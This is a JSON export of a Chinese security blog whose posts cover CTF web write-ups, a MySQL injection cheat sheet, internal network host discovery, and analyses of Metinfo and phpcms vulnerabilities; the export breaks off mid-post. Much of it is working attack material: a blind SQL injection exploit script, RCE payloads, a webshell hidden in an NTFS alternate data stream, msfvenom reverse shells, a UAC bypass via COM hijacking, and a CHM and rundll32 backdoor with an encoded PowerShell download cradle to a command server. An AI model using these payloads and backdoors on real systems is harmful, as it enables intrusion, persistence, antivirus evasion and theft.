{"meta":{"title":"Patrilic's blog","subtitle":null,"description":null,"author":"Patrilic","url":"http://patrilic.top","root":"/"},"pages":[],"posts":[{"title":"第十二届全国大学生信息安全竞赛初赛部分Web Write up","slug":"第十二届全国大学生信息安全竞赛初赛Write up","date":"2019-04-23T03:20:33.000Z","updated":"2019-04-23T04:19:27.142Z","comments":true,"path":"2019/04/23/第十二届全国大学生信息安全竞赛初赛Write up/","link":"","permalink":"http://patrilic.top/2019/04/23/第十二届全国大学生信息安全竞赛初赛Write up/","excerpt":"","text":"[toc] Web1 - JustSosoIndex.php12345678910111213141516171819202122&lt;?phperror_reporting(E_ALL);$payload = $_GET[\"payload\"];require $_GET['file'];if (isset($payload)) &#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'], $query); foreach ($query as $value) &#123; if (preg_match(\"/flag/\", $value)) &#123; echo 'gg'; exit(); &#125; &#125; $payload = unserialize($payload);&#125; else &#123; echo \"Missing parameters\";&#125;?&gt; Hint.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(E_ALL);class Handle&#123; private $handle; // 绕过wakeup public function __wakeup() &#123; foreach (get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct() &#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000)); &#125; public function getFlag() &#123; $this-&gt;token_flag = md5(rand(1, 10000)); if ($this-&gt;token === $this-&gt;token_flag) &#123; if (isset($this-&gt;file)) &#123; echo @highlight_file($this-&gt;file, true); &#125; &#125; &#125;&#125;?&gt; poc.php123456789101112&lt;?phprequire \"hint.php\";$flag = new Flag('flag.php');$flag-&gt;token = 'b706835de79a2b4e80506f582af3676a';$flag-&gt;token_flag = &amp;$flag-&gt;token;$handle = new Handle($flag);$s = serialize($handle);echo urlencode($s); parse_url绕过正则:http://lawlietweb.com/2018/05/13/parse_url/wake_up绕过:https://paper.seebug.org/39/ Web2 - 全宇宙最简单的SQL过滤 or if sleep benchmark参考bctf-love-q利用pow()在条件为假时返回error 运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii 在题目中正确返回登陆失败，错误返回数据库失败 Exp:1234567891011121314151617181920212223242526272829303132import requestsVERSION = \"version()\"USERNAME = \"select username from user limit 1\"PASSWORD = \"select (select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1)\"url = \"http://cba0e34ee5d34db985195191f4c681d5c32c4b92db574826.changame.ichunqiu.com\"result = ''for i in range(1, 50): for j in range(31, 128): payload = &#123; \"username\": \"1'-pow(2,1024-ascii(substr((&#123;data&#125;),&#123;pos&#125;,1))+&#123;code&#125;)-- -\".format( data=PASSWORD, pos=i, code=j ), \"password\": \"1\" &#125; try: resp = requests.post(url=url, data=payload) resp.encoding = 'utf8' if '数据库操作失败' in resp.text: result += chr(j) print(result) break except Exception as e: print(e) continue 利用mysql别名(参考博客中Mysql Injection中# 不用列名的注入) 跑出password : F1AG@1s-at_/fll1llag_h3r3 进入后台为远程数据库连接界面，理想到fake_mysqlServer读文件参考文章https://xz.aliyun.com/t/3973 修改这个脚本里的filelisthttps://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py 然后让题目服务器连接即可 Web3 - lovemath直接嫖队友@hpdoger的wp orz 读到calc.php的源码 黑名单肯定是绕不过去，虽然有/m但是\\r在黑名单所以不存在换行绕过。注意看下面的whitelist。正则匹配函数名，只允许Eval使用白名单的函数做字符串所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下想办法把数字变成字母，着眼于函数base_convert，官方描述如下它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字-&gt;字母的转化，成功打印Phpinfo如下因为字符串长度限制，我最开始的想法是这样的：12$input = hexdec(bin2hex(“system(‘cat /flag’);”))$result = base_convert(10进制编码的hex2bin,10,36).dechex($input) 失败的POC是这样：1base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872)) bin2hex后由于转换出来的16进制数值过大，导致转换的int值很大无法正常被dechex还原而溢出。 卡在这里很久，最后换了一种小数还原的思路。 我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。 Payload如下，注意用白名单的值作为变量参数，否则还是会被拦截1$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;) 转换的调用栈如下： 直接发包给到C参数，成功getflag 还在群里看到一位师傅的Payload 1base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194))) 1exec(nl f*); 79位…… orz","categories":[],"tags":[]},{"title":"ADS隐藏后门","slug":"ADS 隐藏后门","date":"2019-04-18T03:20:33.000Z","updated":"2019-04-23T15:48:29.199Z","comments":true,"path":"2019/04/18/ADS 隐藏后门/","link":"","permalink":"http://patrilic.top/2019/04/18/ADS 隐藏后门/","excerpt":"","text":"高铁上没事干，把以前的笔记总结一下[toc] ADSNTFS交换数据流（alternate data streams，简称ADS） ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。 —– baike.baidu.com 文件命名： ads.txt 普通txt文件 (主文件)ads.txt:nop.txt （寄宿文件） 使用dir命令不能看到，必须使用dir /r Webshell（过D盾）1C:\\phpStudy\\PHPTutorial\\WWW\\webshell&gt;echo \"&lt;?php phpinfo();?&gt;\" &gt; index.php:s.txt 将 小马写入index.php:s.txt中 ，然后再index.php中includeD盾不能获取非主文件流1234567index.php&lt;?php $a=&quot;696e6465782e70&quot;.&quot;68703a732e747874&quot;; $b=&quot;a&quot;; include(PACK(&apos;H*&apos;,$$b))?&gt; 123index.php:s.txt&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt; 测试0x01 环境12MacOS ipaddress: 192.168.43.223Windows 10 ipaddress: 192.168.121.132 0x02 生成shell1msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=8888 -f exe -o shell.exe 0x03 植入后门环境描述：拿到了webshell，经过提权，权限为本地管理员上传一个后门文件 使用type将shell.exe数据写入依附在hello.txt上 1mklink \"c:\\backdoor\\link.exe\" \"c:\\backdoor\\hello.txt:shell.exe\" server 2k3后不能直接执行exe，必须建立链接1start link.exe /b 成功回弹session Thankshttps://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)https://klionsec.github.io/2017/11/13/ntfs-streams/https://blog.csdn.net/migee/article/details/56028011https://blog.csdn.net/xiaoxuetu_/article/details/77318670","categories":[],"tags":[]},{"title":"MySQL Injection（持续更新）","slug":"MySQL Injection","date":"2019-04-14T15:20:33.000Z","updated":"2019-04-23T04:26:55.131Z","comments":true,"path":"2019/04/14/MySQL Injection/","link":"","permalink":"http://patrilic.top/2019/04/14/MySQL Injection/","excerpt":"","text":"[toc] Header总结一波MySQL下各式各样等注入技巧～Test Machine Configuration OS：MacOS Mojave 10.14.2MySQL: MySQL 5.7.19-log 测试表结构： limitEmmmm，测试失败了翻了一些文章，发现limit之后的analyse() 只适用于MySQL server version &lt;= 5.6.6 遂使用 Windows7 x64 + MySQL 5.5.53 测试语句1SELECT username FROM user LIMIT &#123;$uid&#125;,3; Limit 注入主要是因为后面有一个 PROCEDURE analyse() 存储过程 构造报错注入1SELECT username FROM user LIMIT 1,3 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 因为5.5版本不能使用SELECT，所以只能获取一些配置信息等 exp123SELECT username FROM user LIMIT 1,3 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1) order by测试语句：1SELECT * FROM user order by uid &#123;evil&#125;; Order by + 报错注入 order by + 时间盲注 order by + union查询 此注入必须使用()包围SQL语句 order by + regexp 盲注 这里解释一下语句当正则未匹配到数据时候返回的结果是0 所以SQL语句相当于1select * from user order by uid ^ 0; 排序不变exp123456789SELECT * FROM user ORDER BY uid and extractvalue(1,concat(0x3a,user()));SELECT * FROM user ORDER BY uid and updatexml(1,concat(0x3a,user()),1);select * from user order by uid ^(select (select version()) regexp '^aaaaaa');select * from user order by uid,(select 1 from (select sleep(3))a);(select * from user order by uid) union (select 1,(select version()),3,4); from测试语句1SELECT * FROM &#123;$Tables&#125;; 直接嵌套子查询 exp版本限制： Version &lt;= 5.5.5123select exp(~(select*from(select user())x));insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'patrilic'); ExtractValue1Select * from user where uid = 1 and (extractvalue('String',(select user()))); extractvalue(target file，xml path) UpdateXml1Select * from user where uid = 1 and (updatexml('String',(Select user()),'String')); updatexml(Target file，xml path，updateinfo) name_const1Select * from user where uid = 1 and (select name_const(version(),1),name_const(version(),1)); name_const(‘1’, 14)局限性很大 整数溢出报错注入略 insert1Insert INTO user (uid,username,password,city) VALUES (?,?,?,?); delect1DELETE FROM user WHERE uid=&#123;$uid&#125;; update1UPDATE user SET password = &#123;$password&#125; Where username = &#123;session.user&#125; and uid = &#123;session.uid&#125; into outfile主要用途：写shell要求： 要求用户具有file权限 文件不能覆盖写入，所以文件必须为不存在 如果secure_file_priv非空，则写入文件的目录只能为对应目录下 into outfile + UNION 1SELECT * FROM user WHERE uid = -1 union select 1,2,3,0x3c3f70687020706870696e666f28293b3f3e into outfile 'Y:/123.php'; into outfile + LINES TERMINATED BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e; into outfile + FIELDS TERMINATED BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' fields terminated by 0x3c3f70687020706870696e666f28293b3f3e; into outfile + LINES STARTING BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e; load_file主要用途：读文件要求： 要求用户具有file权限 如果secure_file_priv非空，则只能读取对应目录下的文件 load_file + UNION 1select * from user where uid = -1 union select 1,2,3,(select load_file('Y:/123.php')); load_file + updatexml1select * from user where username = '' and updatexml(0,concat(0x7e,(LOAD_FILE('Y:/123.php')),0x7e),0); load_file + extractive1select * from user where uid=-1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE('Y:/1.php'))),0x7e))); load_file + isnull + updatexml1select * from user where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/1.php')),0x7e),0); 存在文件 返回0不存在文件 返回1 Dumpfile1SELECT _utf8'Hello world!' INTO DUMPFILE 'Y:/world.php'; Case When Pow运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii In 不知道列名的注入看原文比较好，直接复现一下 ThanksMySQLi Cookbooklcamry’s blog报错注入邂逅load_file&amp;into outfile搭讪LINESsqli-extracting-data-without-knowing-columns-namewangyihang-sqli-labs-Script史上最水的MYSQL注入总结","categories":[],"tags":[{"name":"Web Security","slug":"Web-Security","permalink":"http://patrilic.top/tags/Web-Security/"}]},{"title":"bypassUAC_via_comhijacking","slug":"bypassUAC_via_comhijacking","date":"2019-04-03T05:12:49.000Z","updated":"2019-04-03T05:25:50.958Z","comments":true,"path":"2019/04/03/bypassUAC_via_comhijacking/","link":"","permalink":"http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/","excerpt":"","text":"0x01 Com劫持原理利用CLSID搜索顺序： HKCU\\Software\\Classes\\CLSID HKCR\\CLSID HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\ 将被劫持的CLSID存入：HKCU\\Software\\Classes\\CLSID CLSID 结构1234HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID &#123;CLSID&#125; InprocServer32 (Default) = path ThreadingModel = value 0x02 uacbypass_comhijack分析判断系统版本 1234567def check if sysinfo['OS'] =~ /Windows (7|8|10|2008|2012|2016)/ &amp;&amp; is_uac_enabled? # 从meterpreter中判断OS版本 Exploit::CheckCode::Appears else Exploit::CheckCode::Safe end end 劫持点：eventvwr.exe 和 mmc.exe12345678910111213@@hijack_points = [ &#123; name: 'Event Viewer', cmd_path: '%WINDIR%\\System32\\eventvwr.exe', class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931'] &#125;, &#123; name: 'Computer Managment', cmd_path: '%WINDIR%\\System32\\mmc.exe', cmd_args: 'CompMgmt.msc', class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931'] &#125; ] 123456789101112131415161718192021222324def hijack_com(registry_view, dll_path) target = @@hijack_points.sample target_clsid = target[:class_ids].sample root_key = \"#&#123;CLSID_PATH&#125;\\\\&#123;#&#123;target_clsid&#125;&#125;\" inproc_key = \"#&#123;root_key&#125;\\\\InProcServer32\" shell_key = \"#&#123;root_key&#125;\\\\ShellFolder\" registry_createkey(root_key, registry_view) registry_createkey(inproc_key, registry_view) registry_createkey(shell_key, registry_view) registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, 'REG_SZ', registry_view) registry_setvaldata(inproc_key, 'ThreadingModel', 'Apartment', 'REG_SZ', registry_view) registry_setvaldata(inproc_key, 'LoadWithoutCOM', '', 'REG_SZ', registry_view) registry_setvaldata(shell_key, 'HideOnDesktop', '', 'REG_SZ', registry_view) registry_setvaldata(shell_key, 'Attributes', 0xf090013d, 'REG_DWORD', registry_view) &#123; name: target[:name], cmd_path: target[:cmd_path], cmd_args: target[:cmd_args], root_key: root_key &#125; end 向注册表添加 HKCU\\Software\\Classes\\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32HKCU\\Software\\Classes\\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder InProcServer 中： Default -&gt; dll_path ThreadingModel -&gt; Apartment LoadWithoutCOM -&gt; Null ShellFolder 中： HideOnDesktop -&gt; Null Attributes -&gt; 0xf090013d 0x03 复现1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.131.36.131 lport=4444 -f exe &gt; out.exe 回弹拿到meterpreter session 无法getsystem 可以看到，劫持了CLSID {0A29FF9E-7F9C-4437-8B11-F424491E3931}的会话，成功拿到反弹session","categories":[],"tags":[]},{"title":"内网主机发现","slug":"内网主机发现","date":"2019-04-03T03:59:32.000Z","updated":"2019-04-03T03:17:54.902Z","comments":true,"path":"2019/04/03/内网主机发现/","link":"","permalink":"http://patrilic.top/2019/04/03/内网主机发现/","excerpt":"","text":"[toc] 0x01 发现内网存活主机1.1 基于ARP发现内网主机nmap1nmap -sn -PR 10.253.6.0/24 powershell1C:\\Users\\Patrilic\\Desktop&gt;powershell -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.121.1/24&quot; Invoke-ARPScan 是Empire中的模块 arp-scan.exe1C:\\Users\\Patrilic\\Desktop&gt;arp-scan.exe -t 192.168.121.0/24 arp-ping.exe1C:\\Users\\Patrilic\\Desktop&gt;arp-ping.exe 192.168.121.1 Empirenetdiscover1netdiscover -r 192.168.3.0/24 -i eth0 meterpreter12meterpreter &gt; getsystemmeterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=10.253.6.1/24 Cain等1.2 基于icmp发现主机cmd1C:\\Users\\Patrilic\\Desktop&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.121.%I | findstr \"TTL=\" nmap1nmap -sn -PE 192.168.3.0/24 powershell1powershell.exe -exec bypass -Command \"Import-Module C:\\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000\" bash1234567for ip in 10.131.36.&#123;1..254&#125; do ping $ip -c 1 &amp;&gt; /dev/null if [ $? -eq 0 ];then echo $ip is alive .... fi done 1.3 基于netbios协议发现主机cmd1nbtstat -n nbtscan1nbtscan-1.0.35.exe -m 192.168.121.0/24 nmap1nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 1.4 基于smb协议发现主机nmap1nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p445 192.168.1.119/24 cmd1for /l %a in(1,1,254) do start /min /low telnet 192.168.1.%a 445 powershell12445|%&#123;echo((new‐objectNet.Sockets.TcpClient).Connect(\"10.253.6\",$_)) \"$_ is open\"&#125; 2&gt;$null 11..5|%&#123;$a=$_;445|%&#123;echo((new‐object Net.Sockets.TcpClient).Connect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; 1118..119|%&#123;$a=$_;write‐host\"‐‐‐‐‐‐\";write‐host \"192.168.1.$a\"; 80,445 | % &#123;echo ((new‐object Net.Sockets.TcpClient).Con ect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; 1.5 基于snmp发现主机nmap1nmap -sU --script snmp-brute 192.168.1.0/24 -T4 perlhttps://github.com/dheiland-r7/snmp 1.6 基于udp发现主机nmap1nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500 unicornscan1unicornscan -mU 192.168.1.100 1.7 基于SqlDataSourceEnumerator1PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\" 1.8 基于msf发现主机http服务1auxiliary/scanner/http/http_version 1auxiliary/scanner/http/title smb服务1auxiliary/scanner/smb/smb_version ftp服务1auxiliary/scanner/ftp/ftp_version 1auxiliary/scanner/ftp/anonymous arp服务1auxiliary/scanner/discovery/arp_sweep udp服务1auxiliary/scanner/discovery/udp_sweep 1auxiliary/scanner/discovery/udp_probe ssh服务1auxiliary/scanner/ssh/ssh_version telnet服务1auxiliary/scanner/telnet/telnet_version dns服务1auxiliary/scanner/dns/dns_amp mysql服务1auxiliary/scanner/mysql/mysql_version netbios服务1auxiliary/scanner/netbios/nbname db2服务1auxiliary/scanner/db2/db2_version 端口发现1auxiliary/scanner/portscan/ack 1auxiliary/scanner/portscan/tcp 1auxiliary/scanner/portscan/syn 1auxiliary/scanner/portscan/syn 1auxiliary/scanner/portscan/ftpbounce 1auxiliary/scanner/portscan/xmas rdp服务1auxiliary/scanner/rdp/rdp_scanner smtp服务1auxiliary/scanner/smtp/smtp_version pop3服务1auxiliary/scanner/pop3/pop3_version posgres服务1auxiliary/scanner/postgres/postgres_version 调用nmap1db_nmap post组件1234567891011windows/gather/arp_scanner windows/gather/enum_ad_computers windows/gather/enum_computers windows/gather/enum_domain windows/gather/enum_domains windows/gather/enum_ad_user_commentslinux/gather/enum_network linux/busybox/enum_hosts windows/gather/enum_ad_users windows/gather/enum_domain_tokens windows/gather/enum_snmp","categories":[],"tags":[]},{"title":"JS+CHM捆绑后门","slug":"JS + CHM 捆绑后门","date":"2019-04-03T03:58:32.000Z","updated":"2019-04-03T03:11:53.290Z","comments":true,"path":"2019/04/03/JS + CHM 捆绑后门/","link":"","permalink":"http://patrilic.top/2019/04/03/JS + CHM 捆绑后门/","excerpt":"","text":"学了一波evi1cg博客上的捆绑后门，做个记录 0x01 思路 思路：利用CHM后门调用rundll32.exe执行javascript获取恶意代码并执行 结果：交互式shell or meterpreter（poershell） 0x02 chm后门calc.exe P0c123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; 利用EasyCHM编译html文件 运行： 0x03 JS后门核心思路：rundll32.exe 执行 javascript 脚本 访问C&amp;C执行恶意代码 Poc：12rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('foo'); 0x04 CHM + JS 捆绑思路：CHM后门 —-&gt; 调用rundll32.exe —–&gt; 调用javascript. —–&gt; 访问目标C2服务器 ——&gt;执行恶意代码 —–&gt; 交互式shell 优点：防止传统CHM后门使用CMD /c 时引起的弹窗 缺点： 直接获取Meterpreter Session 使用Exploit ： exploit/multi/script/web_delivery 存在特殊字符，在cmd下是不能直接运行的,使用Base64编码： Powershell :1powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA== But: 并不能bypass 360主防允许程序执行后，可得到JSRAT Session 以及 meterpreter Session 主要还是检测了rundll32.exe 这个敏感进程 0x05 总结JS后门优点： 无文件落地 持续控制 后台rundll32.exe进程稳定 缺点：不免杀，容易被检测 CHM后门优点：钓鱼强不会被AV检测，只会在调用危险进程时被检测，本身不含有恶意代码 配合可以达到nishang中不弹窗的效果 0x06 JS backdoor Tips//Execute A Command1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;); //Write To A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\\\Temp\\\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close; //Read and Execute From A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\\\Temp\\\\testfile.txt&quot;,1);eval((f.ReadAll())); //Map A Remote Share (WEBDAV)1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;https://live.sysinternals.com&quot;);self.close; //Map A Local Share1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;\\\\\\\\Localhost\\\\c$&quot;);self.close; //Read and Execute Commands From A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\\\Temp\\\\Commands.txt&quot;,1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject(&quot;WScript.Shell&quot;);t.Run(&quot;cmd%20/c%20&quot;%20+%20f.ReadLine(),null,true);&#125;; //Retrieve Commands From HTTP1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1/a.txt&quot;,false);h.Send();B=h.ResponseText;alert(B); //POST results back to Server1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;POST&quot;,&quot;http://127.0.0.1:8081/a.php&quot;,false);h.Send(&quot;Stuff&quot;); 0x07 Linkshttps://evi1cg.me/archives/chm_backdoor.htmlhttp://drops.wooyun.org/tips/8568https://github.com/Ridter/MyJSRathttp://drops.wooyun.org/tips/11764http://drops.wooyun.org/tips/12386","categories":[],"tags":[]},{"title":"Metinfo 6.0.0 任意代码写入导致getshell","slug":"Metinfo 6.0.0 任意代码写入","date":"2019-04-03T02:58:32.000Z","updated":"2019-04-03T03:01:44.495Z","comments":true,"path":"2019/04/03/Metinfo 6.0.0 任意代码写入/","link":"","permalink":"http://patrilic.top/2019/04/03/Metinfo 6.0.0 任意代码写入/","excerpt":"","text":"0x01 漏洞分析漏洞关键点位于/Applications/MxSrvs/www/MetInfo6.0.0/admin/include/global.func.php中约878行的Copyindx函数12345678function Copyindx($newindx,$type)&#123; if(!file_exists($newindx))&#123; $oldcont =\"&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;\"; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; $type可控，并且直接带入到php代码中，前提是不存在 $newindx 变量，往上跟函数 位于/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/global.func.php的124行调用该函数1Copyindx(ROOTPATH.$foldername.'/index.php',$module); 规定 $newindx 为目录名 + /index.php, 然后 $module 该文件 再往上跟，找到/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/save.php 12345678910111213if($if_in==0)&#123; if($filename!='' &amp;&amp; $filename!=$filenameold)&#123; $filenameok = $db-&gt;get_one(\"SELECT * FROM &#123;$met_column&#125; WHERE filename='&#123;$filename&#125;' and foldername='$foldername' and id!='$id'\"); if($filenameok)metsave('-1',$lang_modFilenameok); if(is_numeric($filename) &amp;&amp; $filename!=$id &amp;&amp; $met_pseudo)&#123; $filenameok1 = $db-&gt;get_one(\"SELECT * FROM &#123;$met_column&#125; WHERE id='&#123;$filename&#125;' and foldername='$foldername'\"); if($filenameok1)metsave('-1',$lang_jsx30); &#125; &#125; $filedir=\"../../\".$foldername; if(!file_exists($filedir))@mkdir($filedir,0777); if(!file_exists($filedir))metsave('-1',$lang_modFiledir); column_copyconfig($foldername,$module,$id); 满足该条件即可调用colnmn_copyconfig()函数 攻击流程 登陆后台 构造payload：admin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;phpinfo();/* 访问/upload/index.php 注意： foldername可控，如果upload目录下存在index.php，不会重复写入，更换目录即可 /* 必须要求，会注释掉后面的require_once ‘../include/module.php’; 防止跳转到404页面 0x02 漏洞复现","categories":[],"tags":[]},{"title":"phpcms_v9.6.0 wap模块 SQL注入","slug":"phpcms_v9.6.0 wap模块 sql注入","date":"2019-04-03T02:58:32.000Z","updated":"2019-04-03T02:59:50.468Z","comments":true,"path":"2019/04/03/phpcms_v9.6.0 wap模块 sql注入/","link":"","permalink":"http://patrilic.top/2019/04/03/phpcms_v9.6.0 wap模块 sql注入/","excerpt":"","text":"0x01 漏洞分析漏洞发生在 /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/content/down.php 12345678910111213141516public function init() &#123; $a_k = trim($_GET['a_k']); if(!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key')); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $MODEL = getcache('model','commons'); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid]['tablename']; $this-&gt;db-&gt;table_name = $tablename.'_data'; $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id)); $_GET 方法传入 $a_k ， 经过sys_auth 解密之后，进入 parse_str,解析到变量中最后带入到 \\$rs = \\$this-&gt;db-&gt;get_one(array(‘id’=&gt;$id)); 进行查询 所以现在如果能找到一个经过sys_auth 并能回显给我payload的地方即可 /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/attachment/attachments.php 123456789101112131415public function swfupload_json() &#123; $arr['aid'] = intval($_GET['aid']); $arr['src'] = safe_replace(trim($_GET['src'])); $arr['filename'] = 